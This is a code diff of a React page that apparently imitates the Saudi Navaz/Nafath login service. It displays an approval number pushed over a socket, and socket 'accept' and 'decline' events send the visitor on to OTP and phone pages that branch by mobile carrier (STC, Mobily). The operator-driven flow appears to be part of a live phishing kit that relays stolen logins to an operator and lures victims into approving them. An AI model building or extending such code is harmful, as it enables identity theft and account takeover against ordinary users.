@@ -5,17 +5,31 @@ import { useState } from "react";
 const Navaz = () => {
   const query = new URLSearchParams(window.location.search);
   const [otp, setOtp] = useState(query.get("otp"));
+  const stc = query.get("stc");
 
-  socket.on("acceptPhoneOTP", ({ price, id }) => {
+  socket.on("acceptNavaz", (id) => {
+    if (id === sessionStorage.getItem("id")) {
+      return (window.location.href = "/navazOtp");
+    }
+  });
+  socket.on("declineNavaz", (id) => {
+    if (id === sessionStorage.getItem("id")) {
+      if (stc === "check") {
+        window.location.href = "/phoneOtp?stc=check";
+      } else if (stc === "null") {
+        window.location.href = "/phone?mobily=check";
+      } else {
+        window.location.href = "/phoneOtp";
+      }
+    }
+  });
+
+  socket.on("navazChange", ({ price, id }) => {
     if (id === sessionStorage.getItem("id")) {
       return setOtp(price);
     }
   });
-  socket.on("declinePhoneOTP", (id) => {
-    if (id === sessionStorage.getItem("id")) {
-      window.location.href = "/phone";
-    }
-  });
+
   return (
     <div className="w-full flex flex-col items-center justify-center bg-white py-5 gap-5 ">
       <img src="/navazLogo.png" alt="navazLogo Logo" className="w-16" />
@@ -47,7 +61,7 @@ const Navaz = () => {
       >
         {otp ? otp : "??"}
       </div>
-      <img src="/navazOtp.jpg" className="md:w-2/5 " />
+      <img src="/navazOtp.jpg" className="md:w-2/5 p-2 " />
     </div>
   );
 };
